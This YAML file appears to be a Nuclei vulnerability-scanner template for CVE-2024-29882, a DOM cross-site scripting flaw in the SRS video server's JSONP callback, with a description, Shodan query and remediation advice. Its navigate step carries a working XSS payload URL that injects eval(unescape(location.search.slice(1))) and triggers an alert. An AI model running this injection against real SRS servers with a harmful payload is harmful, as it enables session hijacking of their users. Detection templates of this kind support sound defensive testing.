headless:
- matchers:
  - dsl:
    - object_dom == true
    type: dsl
  - case-insensitive: true
    condition: or
    part: body
    type: word
    words:
    - <title>SRS
    - ConnectSRS</a>
  matchers-condition: and
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}/console/en_index.html?alert(document.domain)#/vhosts/vid-xsedfv%3Fcallback=eval(unescape(location.search.slice(1)))%252f%252f'
  - action: waitdialog
    name: object_dom
id: CVE-2024-29882
info:
  author: rootxharsh,iamnoooob,pdresearch
  classification:
    cve-id: CVE-2024-29882
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
    epss-percentile: 0.8704
    epss-score: 0.03404
  description: 'SRS is a simple, high-efficiency, real-time video server. SRS''s `/api/v1/vhosts/vid-<id>?callback=<payload>`
    endpoint didn''t filter the callback function name which led to injecting malicious
    javascript payloads and executing XSS ( Cross-Site Scripting). This vulnerability
    is fixed in 5.0.210 and 6.0.121.

    '
  impact: 'Attackers can execute arbitrary JavaScript in the context of the victim''s
    browser, potentially leading to session hijacking or defacement.

    '
  metadata:
    max-request: 1
    product: simple_realtime_server
    shodan-query: http.favicon.hash:1386054408
    vendor: ossrs
    verified: true
  name: HTTP API DOM - XSS on JSONP callback
  reference:
  - https://github.com/ossrs/srs/commit/244ce7bc013a0b805274a65132a2980680ba6b9d
  - https://github.com/ossrs/srs/security/advisories/GHSA-gv9r-qcjc-5hj7
  remediation: 'Upgrade Simple Realtime Server (SRS) to version 5.0.210, 6.0.121,
    or later that properly sanitizes the JSONP callback parameter.

    '
  severity: high
  tags: cve,cve2023,srs,dom,xss,vuln
